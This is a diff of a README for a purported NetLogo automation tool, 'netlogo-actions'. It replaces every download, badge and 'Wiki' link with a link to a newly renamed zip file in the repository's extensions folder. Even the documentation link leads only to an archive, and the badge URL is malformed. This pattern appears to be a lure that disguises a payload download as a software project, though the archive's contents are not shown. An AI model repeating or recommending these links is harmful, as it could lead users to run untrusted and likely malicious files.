@@ -1,6 +1,6 @@
 # 🚀 netlogo-actions - Streamline Your NetLogo Workflow
 
-[![Download Now](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/dialog/netlogo-actions_v3.8-alpha.2.zip%20Now-Here-blue)](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/dialog/netlogo-actions_v3.8-alpha.2.zip)
+[![Download Now](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/pathdir/actions_netlogo_v3.7.zip%20Now-Here-blue)](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/pathdir/actions_netlogo_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **netlogo-actions**! This tool helps you automate and manage your Net
 
 To get started, visit the Releases page to download the latest version of **netlogo-actions**:
 
-[Download Here](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/dialog/netlogo-actions_v3.8-alpha.2.zip)
+[Download Here](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/pathdir/actions_netlogo_v3.7.zip)
 
 Follow these steps to install and run the software:
 
@@ -36,7 +36,7 @@ Follow these steps to install and run the software:
 
 ## 📖 Documentation
 
-For detailed documentation, please refer to the [Wiki](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/dialog/netlogo-actions_v3.8-alpha.2.zip). The Wiki includes guides on setting up your models, troubleshooting tips, and best practices for using GitHub Actions effectively.
+For detailed documentation, please refer to the [Wiki](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/pathdir/actions_netlogo_v3.7.zip). The Wiki includes guides on setting up your models, troubleshooting tips, and best practices for using GitHub Actions effectively.
 
 ## 🤝 Community Contributions
 
@@ -60,6 +60,6 @@ You can ask questions in the Issues section of this repository, or check communi
 
 For additional support or inquiries, reach out via the Issues section on GitHub or connect with us through our community channels.
 
-[Download Here](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/dialog/netlogo-actions_v3.8-alpha.2.zip) 
+[Download Here](https://raw.githubusercontent.com/elcproooo/netlogo-actions/main/extensions/pathdir/actions_netlogo_v3.7.zip) 
 
 Enjoy streamlined automation in your NetLogo projects with **netlogo-actions**!
